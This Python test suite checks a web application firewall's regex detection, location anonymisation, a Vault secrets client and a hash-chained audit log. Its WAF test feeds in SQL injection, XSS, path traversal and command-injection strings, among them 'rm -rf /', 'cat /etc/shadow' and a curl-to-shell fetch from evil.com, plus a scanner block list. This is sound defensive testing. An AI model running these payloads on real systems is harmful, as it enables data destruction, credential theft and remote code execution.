"""
Phase 7 Enterprise Security & Compliance Automated Test Suite
Validates:
1. OWASP Core Rule Set WAF (SQLi, XSS, Path Traversal, RCE, Malicious Bots)
2. Location Privacy Engine (HMAC-SHA256 Tokenization, 200m Polar Fuzzing, Laplace Differential Privacy)
3. HashiCorp Vault Zero-Trust Client (Dynamic Leasing, Lease Rotation, Health Metrics)
4. Sentry Crash Escalation & Cryptographic SHA-256 Tamper-Evident Audit Chain Integrity
"""

import math
import time
import hashlib
import sys
from pathlib import Path

# Ensure UTF-8 output on Windows consoles
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")

# Add backend directory to sys.path
sys.path.insert(0, str(Path(__file__).resolve().parent))

from app.core.waf_middleware import (
    OWASPModSecurityWAFMiddleware,
    SQLI_PATTERNS,
    XSS_PATTERNS,
    PATH_TRAVERSAL_PATTERNS,
    RCE_PATTERNS,
    MALICIOUS_USER_AGENTS,
    get_waf_metrics,
    WAF_GLOBAL_STATS
)
from app.services.privacy_anonymizer import LocationPrivacyEngine
from app.core.vault_client import HashiCorpVaultClient
from app.services.crash_escalation import CrashEscalationService


def test_owasp_waf_heuristics():
    print("\n[TEST 1] OWASP CRS WAF Heuristics & Injection Screening...")
    
    # SQL Injection Tests
    sqli_samples = [
        "SELECT * FROM users WHERE id = 1 OR 1=1",
        "admin' --",
        "UNION SELECT null, username, password FROM users",
        "; DROP TABLE telemetry_incidents;"
    ]
    for sample in sqli_samples:
        assert SQLI_PATTERNS.search(sample), f"Failed to detect SQLi: {sample}"
    print("  [PASS] SQL Injection patterns correctly identified (4/4 tests passed)")

    # XSS Tests
    xss_samples = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:document.cookie"
    ]
    for sample in xss_samples:
        assert XSS_PATTERNS.search(sample), f"Failed to detect XSS: {sample}"
    print("  [PASS] Cross-Site Scripting patterns correctly identified (3/3 tests passed)")

    # Path Traversal Tests
    path_samples = [
        "../../../../etc/passwd",
        "..\\..\\win.ini",
        "/proc/self/environ"
    ]
    for sample in path_samples:
        assert PATH_TRAVERSAL_PATTERNS.search(sample), f"Failed to detect Path Traversal: {sample}"
    print("  [PASS] Path Traversal & LFI patterns correctly identified (3/3 tests passed)")

    # RCE Tests
    rce_samples = [
        "; rm -rf /",
        "| cat /etc/shadow",
        "; whoami",
        "curl http://evil.com/shell.sh | sh"
    ]
    for sample in rce_samples:
        assert RCE_PATTERNS.search(sample), f"Failed to detect RCE: {sample}"
    print("  [PASS] Remote Command Execution patterns correctly identified (4/4 tests passed)")

    # Malicious User-Agent Tests
    crawler_samples = ["sqlmap/1.4", "Nikto/2.1.6", "acunetix-scanner", "dirbuster-1.0"]
    for agent in crawler_samples:
        assert MALICIOUS_USER_AGENTS.search(agent), f"Failed to detect scanner: {agent}"
    print("  [PASS] Malicious vulnerability scanners & bots correctly blocked (4/4 tests passed)")

    # Benign Safe Requests
    benign_samples = [
        "Organic nitrogen fertilizer for tomato crop",
        "How to prevent powdery mildew in wheat?",
        "APMC market prices for paddy today"
    ]
    for benign in benign_samples:
        assert not SQLI_PATTERNS.search(benign), f"False positive SQLi on benign: {benign}"
        assert not XSS_PATTERNS.search(benign), f"False positive XSS on benign: {benign}"
    print("  [PASS] Benign agriculture payloads cleared without false positives (3/3 tests passed)")


def test_location_privacy_anonymizer():
    print("\n[TEST 2] Location Privacy & Differential Privacy Engine...")
    engine = LocationPrivacyEngine(master_salt="test_salt_verification_2026")

    # 1. Ephemeral HMAC-SHA256 Tokenization
    driver_id = "DRIVER-AP-TEL-5544"
    token_today = engine.generate_ephemeral_token(driver_id, "2026-10-01")
    token_tomorrow = engine.generate_ephemeral_token(driver_id, "2026-10-02")
    
    assert token_today.startswith("ANON-"), "Token must begin with ANON-"
    assert token_today != token_tomorrow, "Token must rotate daily to prevent cross-day tracking"
    assert token_today == engine.generate_ephemeral_token(driver_id, "2026-10-01"), "Token must be deterministic within same day"
    print("  [PASS] HMAC-SHA256 ephemeral daily rotation verified")

    # 2. Haversine Distance Validation
    # Hyderabad Charminar (17.3616, 78.4747) to Golconda Fort (17.3833, 78.4011) is ~8.1 km
    dist = engine.haversine_meters(17.3616, 78.4747, 17.3833, 78.4011)
    assert 7800 < dist < 8500, f"Haversine calculation error: {dist}m"
    print(f"  [PASS] Haversine geodesic calculation accurate ({dist:.1f}m)")

    # 3. First/Last Mile 200m Polar Obfuscation
    origin_lat, origin_lon = 17.3850, 78.4867
    # Point 30m away from origin (inside 200m home zone)
    near_lat = origin_lat + 0.0002
    near_lon = origin_lon + 0.0002
    fuzzed_lat, fuzzed_lon, was_fuzzed = engine.apply_first_last_mile_fuzzing(
        near_lat, near_lon, origin_lat, origin_lon, None, None
    )
    assert was_fuzzed, "Point inside 200m origin zone must trigger fuzzing"
    shift_meters = engine.haversine_meters(near_lat, near_lon, fuzzed_lat, fuzzed_lon)
    assert shift_meters >= 50.0, f"Displacement must be at least 50m: got {shift_meters}m"
    print(f"  [PASS] First/Last mile masking displaced coordinate by {shift_meters:.1f} meters")

    # Point 5km away (outside zone)
    far_lat = origin_lat + 0.05
    far_lon = origin_lon + 0.05
    _, _, far_fuzzed = engine.apply_first_last_mile_fuzzing(
        far_lat, far_lon, origin_lat, origin_lon, None, None
    )
    assert not far_fuzzed, "Point 5km away must NOT be displaced by origin fuzzing"
    print("  [PASS] Mid-corridor points preserved without origin fuzzing")

    # 4. Laplace Differential Privacy Noise
    dp_lat, dp_lon = engine.add_differential_privacy_noise(origin_lat, origin_lon, epsilon=0.5)
    dp_shift = engine.haversine_meters(origin_lat, origin_lon, dp_lat, dp_lon)
    assert dp_shift > 0.0, "Laplace noise must introduce non-zero perturbation"
    assert dp_shift < 1000.0, "Laplace noise should remain bounded for utility"
    print(f"  [PASS] Laplace Differential Privacy (epsilon=0.5) added {dp_shift:.2f}m noise")

    # 5. Full Record Anonymization
    record = {
        "latitude": origin_lat,
        "longitude": origin_lon,
        "speed_kmh": 45.0,
        "heading": 180.0
    }
    sanitized = engine.anonymize_telemetry_record(
        record, identifier="VEH-SECRET-HARDWARE-99", origin_lat=origin_lat, origin_lon=origin_lon, apply_dp=True
    )
    assert "VEH-SECRET-HARDWARE-99" not in str(sanitized), "Hardware ID must be stripped"
    assert sanitized["privacy_compliance"]["user_id_stripped"] is True
    assert sanitized["privacy_compliance"]["first_last_mile_masked"] is True
    assert sanitized["privacy_compliance"]["differential_privacy_applied"] is True
    print("  [PASS] Full telemetry record sanitized with GDPR / India Geospatial Policy 2022 compliance")


def test_hashicorp_vault_client():
    print("\n[TEST 3] HashiCorp Vault Dynamic Secrets & Zero-Trust Leasing...")
    vault = HashiCorpVaultClient()
    
    # 1. Retrieve Dynamic Leased Secret
    secret = vault.get_secret("secret/data/database")
    assert secret is not None, "Failed to retrieve secret/data/database"
    assert secret["engine"] == "PostGIS PostgreSQL 16"
    assert secret["renewable"] is True
    print("  [PASS] Retrieved zero-trust PostGIS dynamic credential lease")

    # 2. Dynamic Lease Renewal
    renewal = vault.renew_lease("database/creds/farmiq-role-3j9a")
    assert renewal["status"] == "renewed"
    assert renewal["lease_duration_sec"] == 3600
    print("  [PASS] Dynamic lease renewal succeeded (3600s)")

    # 3. Vault Health & Cipher Status
    health = vault.get_vault_health()
    assert "SEALED_UNLOCKED" in health["vault_status"]
    assert "AES-256-GCM" in health["encryption_cipher"]
    assert health["token_lease_remaining_seconds"] > 0
    print(f"  [PASS] Vault health verified ({health['vault_status']}, {health['encryption_cipher']})")


def test_sentry_crash_escalation_and_blockchain():
    print("\n[TEST 4] Sentry Crash Alert Escalation & Cryptographic Audit Blockchain...")
    service = CrashEscalationService()

    # Initial state has genesis block
    initial_count = len(service.audit_log_chain)
    assert initial_count >= 1, "Must contain genesis audit block"

    # Report P0 Outage
    p0_incident = service.report_exception(
        exception_name="PostGISClusterPartitionException",
        message="Citus spatial shard node 2 uncontactable during peak telemetry",
        module="scale_hardening",
        severity="P0_CRITICAL"
    )
    assert "P0" in p0_incident["severity"]
    assert "PAGERDUTY" in p0_incident["escalation_channel"]
    assert p0_incident["auto_escalated"] is True
    print("  [PASS] P0 Critical Outage automatically escalated to PagerDuty War Room")

    # Report P1 Incident
    p1_incident = service.report_exception(
        exception_name="KafkaRebalanceTimeout",
        message="Telemetry consumer group partition rebalance exceeded 5000ms",
        module="stream_processing",
        severity="P1_HIGH"
    )
    assert "P1" in p1_incident["severity"]
    assert "OPS_DISPATCH" in p1_incident["escalation_channel"]
    print("  [PASS] P1 High Anomaly escalated to Ops Dispatch")

    # Cryptographic Hash Chain Integrity Validation
    chain = service.audit_log_chain
    assert len(chain) == initial_count + 2, "Chain must contain exactly 2 new blocks"

    for i in range(1, len(chain)):
        prev_block = chain[i - 1]
        curr_block = chain[i]
        
        # Verify hash pointer linking
        assert curr_block["prev_hash"] == prev_block["current_hash"], (
            f"Hash pointer broken at block {curr_block['block_id']}: "
            f"{curr_block['prev_hash']} != {prev_block['current_hash']}"
        )

        # Re-compute current hash from block payload
        payload = (
            f"{curr_block['prev_hash']}|{curr_block['timestamp']}|"
            f"{curr_block['event_type']}|{curr_block['severity']}|{curr_block['details']}"
        )
        expected_hash = hashlib.sha256(payload.encode("utf-8")).hexdigest()
        assert curr_block["current_hash"] == expected_hash, (
            f"Block hash integrity violation at block {curr_block['block_id']}"
        )

    print(f"  [PASS] Cryptographic hash pointer chain mathematically verified ({len(chain)} blocks, 0 tampering)")


if __name__ == "__main__":
    print("================================================================================")
    print("PHASE 7 ENTERPRISE SECURITY & COMPLIANCE AUTOMATED VALIDATION")
    print("================================================================================")
    test_owasp_waf_heuristics()
    test_location_privacy_anonymizer()
    test_hashicorp_vault_client()
    test_sentry_crash_escalation_and_blockchain()
    print("\n================================================================================")
    print("ALL PHASE 7 SECURITY & COMPLIANCE TESTS COMPLETED SUCCESSFULLY! (100% PASSED)")
    print("================================================================================\n")
